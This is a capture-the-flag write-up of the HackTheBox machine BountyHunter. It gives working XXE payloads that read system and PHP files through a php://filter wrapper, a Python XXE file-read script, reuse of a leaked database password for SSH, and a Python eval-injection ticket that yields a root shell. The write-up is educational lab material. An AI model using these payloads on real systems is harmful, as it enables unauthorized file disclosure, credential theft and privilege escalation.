---
title: HTB: BountyHunter
url: https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html
date: 2021-11-20T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-bountyhunter, hackthebox, nmap, xxe, feroxbuster, decoder, python, credentials, password-reuse, python-eval, command-injection
---

![BountyHunter](https://0xdfimages.gitlab.io/img/bountyhunter-cover.png)

BountyHunter has a really nice simple XXE vulnerability in a webpage that provides access to files on the host. With that, I can get the users on the system, as well as a password in a PHP script, and use that to get SSH access to the host. To privesc, there’s a ticket validation script that runs as root that is vulnerable to Python eval injection.

## Box Info

| Name | [BountyHunter](https://hackthebox.com/machines/bountyhunter)  [BountyHunter](https://hackthebox.com/machines/bountyhunter) [Play on HackTheBox](https://hackthebox.com/machines/bountyhunter) |
| --- | --- |
| Release Date | [24 Jul 2021](https://twitter.com/hackthebox_eu/status/1461007660535459845) |
| Retire Date | 20 Nov 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for BountyHunter |
| Radar Graph | Radar chart for BountyHunter |
| First Blood User | 00:13:16[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 00:18:22[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [ejedev ejedev](https://app.hackthebox.com/users/280547) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 12:28 EDT
Nmap scan report for 10.10.11.100
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 155.84 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 12:31 EDT
Nmap scan report for 10.10.11.100
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

The site is for a pentesting / bug bounty group:

[![image-20210720123643358](https://0xdfimages.gitlab.io/img/image-20210720123643358.png)](https://0xdfimages.gitlab.io/img/image-20210720123643358.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210720123643358.png)

The About and Contact links just lead to areas on the main page. The Portal link leads to a simple page that says it’s still under development:

![image-20210720125024124](https://0xdfimages.gitlab.io/img/image-20210720125024124.png)

Clicking the link leads to `/log_submit.php`, a simple bug reporting form:

![image-20210720125525756](https://0xdfimages.gitlab.io/img/image-20210720125525756.png)

When I fill it out and hit submit, it shows what would have gone to the DB if it were implemented:

![image-20210720125614654](https://0xdfimages.gitlab.io/img/image-20210720125614654.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.100 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        5l       15w      125c http://10.10.11.100/portal.php
301        9l       28w      316c http://10.10.11.100/resources
301        9l       28w      309c http://10.10.11.100/js
200      388l     1470w        0c http://10.10.11.100/index.php
301        9l       28w      310c http://10.10.11.100/css
301        9l       28w      313c http://10.10.11.100/assets
200        0l        0w        0c http://10.10.11.100/db.php
403        9l       28w      277c http://10.10.11.100/server-status
301        9l       28w      317c http://10.10.11.100/assets/img
301        9l       28w      327c http://10.10.11.100/assets/img/portfolio
[####################] - 6m    419986/419986  0s      found:10      errors:359    
[####################] - 3m     59998/59998   333/s   http://10.10.11.100
[####################] - 3m     59998/59998   332/s   http://10.10.11.100/resources
[####################] - 2m     59998/59998   336/s   http://10.10.11.100/js
[####################] - 3m     59998/59998   336/s   http://10.10.11.100/css
[####################] - 2m     59998/59998   335/s   http://10.10.11.100/assets
[####################] - 2m     59998/59998   440/s   http://10.10.11.100/assets/img
[####################] - 2m     59998/59998   446/s   http://10.10.11.100/assets/img/portfolio

```

Most of the results I already knew about, but `db.php` is interesting, especially since the site said there was no DB connected yet.

#### Tech Stack

Nothing interesting in the page source or in the response headers:

```

HTTP/1.1 200 OK
Date: Tue, 20 Jul 2021 16:37:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 25169
Connection: close
Content-Type: text/html; charset=UTF-8

```

The Apache version matches what `nmap` reported above.

The biggest thing of interest is the POST request to submit the bounty report:

```

POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 227
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UaXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz45Ljg8L2N2c3M%2BCgkJPHJld2FyZD4xLDAwMCwwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D

```

The data looks to be base64-encoded, and then url encoded (because the `=` on the end becomes `%3d`).

Throwing that blob over to Burp Decoder, I’ll select Decode as url and then base64:

![image-20210720130935141](https://0xdfimages.gitlab.io/img/image-20210720130935141.png)

Interestingly, the result is XML:

```

<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>Title</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>

```

## Shell as development

### XXE File Read

#### Background

Any time I can submit XML to a site, I’ll check for an XML External Entities attack. The idea is that this website is taking the XML input and parsing it to get the different values out. In the site on BountyHunter, it must be pulling the `title`, `cwe`, `cvss`, and `reward` variables so that it can display them back on the results page.

If the site doesn’t properly handle the XML input, the libraries that parse it will allow the user to put in control text that does things like create variables and read files. This can be used in more advanced scenarios to perform server-side request forgeries (SSRF) or in cases where no user data is displayed back, use out of band connections to exfil data. But in the simplest case, XXEs are used to read files.

The example classic payload looks something like this (example from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)):

```

<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

The first line is very similar to what is sent in the POST for BountyHunter, and the last line is the XML data itself. The middle lines are defining an entity which includes the variable `&file` which is the contents of the `/etc/passwd` file. This allows the user to send in the contents of files they can’t read as input, and if that input is displayed back, then the exploit allows for file read.

#### POC On BountyHunter

With this version of XXE exploit, it’s important to work with the structure of the original data:

```

<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>

```

The `DOCTYPE` name (`foo`) and the `ELEMENT` name (`bar`) are not important. It’s the entity that’s defined, in this case, `xxe`, which will be the contents of `/etc/passwd` that matters. I’ll reference that value later with the variable name proceeded by `&` and ending with `;`.

I’ll throw that into a file and base64 encode it (`-w0` to prevent line wrapping):

```

oxdf@parrot$ base64 -w0 xxe-passwd
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/PgogIDwhRE9DVFlQRSBmb28gWyAgCiAgPCFFTEVNRU5UIGJhciBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+Q1dFPC9jd2U+CgkJPGN2c3M+OS44PC9jdnNzPgoJCTxyZXdhcmQ+MSwwMDAsMDAwPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+Cg==

```

Back in Burp, I’ll find the POST request, right click, and send to Repeater. There I’ll edit the `data` to be the new payload. I’ll then select the entire base64-string (but not `data=`) and push Ctrl-u to url-encode it. When I hit Send, the result contains `/etc/passwd`:

![image-20210720134520392](https://0xdfimages.gitlab.io/img/image-20210720134520392.png)

It’s sitting where the title input would have been, where I had `&xxe;`.

#### PHP File Reads

I’ll take a guess that the web root on this host is `/var/www/html`. If that’s the case, I should be able to read `/var/www/html/index.php`. I’ll update the payload, but it just returns empty. This could be because the location isn’t right, but it also could be the the code is failing to process the PHP as an entity and that’s breaking the process.

One way to get around this is to try a PHP filter. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe) has an example of this too:

```

<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

```

For BountyHunter, that would look like:

```

<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>

```

Sending that gets base64 text as the title:

![image-20210720142201915](https://0xdfimages.gitlab.io/img/image-20210720142201915.png)

And it decodes to `/etc/passwd`:

```

oxdf@parrot$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRldmVsb3BtZW50Ong6MTAwMDoxMDAwOkRldmVsb3BtZW50Oi9ob21lL2RldmVsb3BtZW50Oi9iaW4vYmFzaApseGQ6eDo5OTg6MTAwOjovdmFyL3NuYXAvbHhkL2NvbW1vbi9seGQ6L2Jpbi9mYWxzZQp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4K" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...[snip]...

```

This works changing the file to `/var/www/html/index.php` as well:

![image-20210720142333313](https://0xdfimages.gitlab.io/img/image-20210720142333313.png)

#### Script It

Because I want to be able to read files easily (and I never want to pass up a chance to practice coding), I’ll write a short Python script:

```

#!/usr/bin/env python3

import requests
import sys
from base64 import b64encode, b64decode

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} filename")
    sys.exit()

xxe = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={sys.argv[1]}" >]>
                <bugreport>
                <title>&xxe;</title>
                <cwe>CWE</cwe>
                <cvss>9.8</cvss>
                <reward>1,000,000</reward>
                </bugreport>"""

payload = b64encode(xxe.encode())

resp = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php',
        data = {'data': payload},
        proxies = {'http': 'http://127.0.0.1:8080'})

encoded_result = '>'.join(resp.text.split('>')[5:-21])[:-4]
result = b64decode(encoded_result)
print(result.decode())  

```

It fills in the filename into the XXE payload, then encodes it, and sends it to BountyHunter. It gets the response, and pulls out the result, decodes it, and prints it.

```

oxdf@parrot$ python xxe.py /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS"
oxdf@parrot$ python xxe.py /var/www/html/portal.php
<html>
<center>
Portal under development. Go <a href="log_submit.php">here</a> to test the bounty tracker.
</center>
</html>

```

### Credentials

The page made mention of the database not being active, but there was also a `db.php` identified by `feroxbuster`. The file appears set up with credentials:

```

oxdf@parrot$ python xxe.py /var/www/html/db.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```

I already pulled `/etc/passwd`. I’ll `grep` it to remove users who can’t login:

```

oxdf@parrot$ python xxe.py /etc/passwd | grep -v -e false -e nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
development:x:1000:1000:Development:/home/development:/bin/bash

```

### SSH

The only real user that I could SSH as at this point is development. I’ll give it a try with the creds from `db.php` and it works:

```

oxdf@parrot$ sshpass -p 'm19RoAU0hP41A1sTsq6K' ssh development@10.10.11.100
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
...[snip]...
development@bountyhunter:~$

```

I can now grab `user.txt`:

```

development@bountyhunter:~$ cat user.txt
3703d60c************************

```

## Shell as root

### Enumeration

In development’s homedir, in addition to `user.txt`, there’s a `contract.txt` and a `skytrain_inc` folder:

```

development@bountyhunter:~$ ls
contract.txt  skytrain_inc  user.txt

```

`contract.txt` is a message:

> Hey team,
>
> I’ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
>
> This has been our first job since the “rm -rf” incident and we can’t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
>
> I set up the permissions for you to test this. Good luck.
>
> – John

The `skytrain_inc` folder has a folder that’s owned by root and a Python script:

```

root@bountyhunter:/home/development/skytrain_inc# ls -l
total 8
drwxr-xr-x 2 root root 4096 Jun 15 16:37 invalid_tickets
-rwxr--r-- 1 root root 1471 Jun 15 16:31 ticketValidator.py

```

The note mentions that permissions were given, and development has permissions to run `ticketValidator.py` as root:

```

development@bountyhunter:~/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /home/development/skytrain_inc/ticketValidator.py

```

The script looks to do just what it says, parsing markdown files and validating various aspects:

```

#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

There are four invalid tickets in the folder:

```

development@bountyhunter:~/skytrain_inc$ ls invalid_tickets/
390681613.md  529582686.md  600939065.md  734485704.md

```

For example, `529582686.md`:

```

# Skytrain Inc
## Ticket to Bridgeport
**32+110+43**
##Issued: 2021/04/06
#End Ticket

```

Running the script reports that the ticket is invalid, but doesn’t give much more than that:

```

development@bountyhunter:~/skytrain_inc$ python3 ticketValidator.py invalid_tickets/529582686.md 
Please enter the path to the ticket file.
invalid_tickets/529582686.md
Destination: Bridgeport
Invalid ticket.

```

### Eval Exploit

#### Conditions

The risky call in the Python script is `eval`, which runs input as Python code. Based on the invalid tickets, it looks like it’s using the `eval` to do some math in a string. But I can make it do much more than that.

I’ll need to construct a ticket that gets to that point in the script:
1. First row starts with “”# Skytrain Inc”
2. Second row starts with “## Ticket to “
3. There needs to be a line that starts with “\_\_Ticket Code:\_\_”
4. The line after the ticket code line must start with “\*\*”
5. The text after the “\*\*” until the first “+” must be an int that when divided by 7 has a remainder of 4.

If all those conditions are met, then the line (with “\*\*” removed) will be passed to `eval`.

#### Valid Ticket

I’ll start by making a valid ticket. If the ticket is valid, that I know that `eval` is being called. Working from one of the invalid tickets, I came up with:

```

# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43**
##Issued: 2021/04/06
#End Ticket

```

It validates:

```

development@bountyhunter:/dev/shm$ sudo python3.8 /home/development/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/tick.md
Destination: Bridgeport
Valid ticket.

```

#### Eval Injection

The simplest way to inject into `eval` is to import the `os` modules and call `system`. In an `eval` injection, you do the import slightly differently:

```

__import__('os').system('[command]')

```

So I’ll make a ticket that does just that:

```

# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('id')**
##Issued: 2021/04/06
#End Ticket

```

On neat thing about this injection is that even though the result is never printed, this call will print to the screen:

```

development@bountyhunter:/dev/shm$ sudo python3.8 /home/development/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/exp.md
Destination: Bridgeport
uid=0(root) gid=0(root) groups=0(root)
Valid ticket.

```

It’s even a valid ticket!

#### Shell

I’ll change `id` to `/bin/bash`:

```

# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('bash')**
##Issued: 2021/04/06
#End Ticket

```

And run it again:

```

development@bountyhunter:/dev/shm$ sudo python3.8 /home/development/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/exp.md
Destination: Bridgeport
root@bountyhunter:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab the flag:

```

root@bountyhunter:~# cat root.txt
d5006bbb************************

```